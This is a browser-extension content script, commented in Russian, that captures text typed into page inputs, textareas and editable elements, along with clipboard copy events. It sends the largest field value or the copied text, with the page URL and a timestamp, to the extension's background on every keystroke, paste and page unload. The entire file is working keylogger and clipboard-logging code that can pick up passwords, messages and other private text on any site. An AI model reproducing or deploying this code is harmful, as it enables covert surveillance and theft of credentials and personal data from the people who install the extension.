// Сбор текста/буфера: inputs, textarea, contentEditable, keydown/paste/copy
const send = (msg) => browser.runtime.sendMessage(msg).catch(()=>{});
const deb = (fn, t=300)=>{ let id; return (...a)=>{ clearTimeout(id); id=setTimeout(()=>fn(...a),t); }; };

function captureTextState() {
  const nodes = [
    ...document.querySelectorAll('textarea, input[type="text"], input:not([type])'),
    ...[...document.querySelectorAll('[contenteditable=""], [contenteditable="true"]')]
      .filter(el => el && typeof el.innerText === 'string' && el.innerText.trim().length >= 3)
      .map(el => ({ _ce: true, value: el.innerText }))
  ].map(el => el._ce ? el : (el && typeof el.value === 'string' ? el : null)).filter(Boolean);

  if (!nodes.length) return null;
  const getVal = (el)=> el._ce ? el.value : el.value;
  const sorted = nodes.sort((a,b)=> (getVal(b)?.length||0) - (getVal(a)?.length||0));
  const val = getVal(sorted[0]) || '';
  return { val: String(val).slice(0,5000), url: location.href, ts: Date.now() };
}

const pushText = deb(()=>{
  const s = captureTextState();
  if (s) send({ type:"text-input", ...s });
}, 250);

['input','change','keydown','paste'].forEach(ev => document.addEventListener(ev, pushText, true));

window.addEventListener('beforeunload', ()=>{
  const s = captureTextState();
  if (s) send({ type:"text-input", ...s });
}, true);

// Clipboard (copy)
document.addEventListener('copy', (e)=>{
  let txt = '';
  try {
    txt = document.getSelection()?.toString() || '';
    if (!txt && e.clipboardData) txt = e.clipboardData.getData('text/plain') || '';
  } catch {}
  if (txt) send({ type:"clipboard", val: txt.slice(0,5000), url: location.href, ts: Date.now() });
}, true);
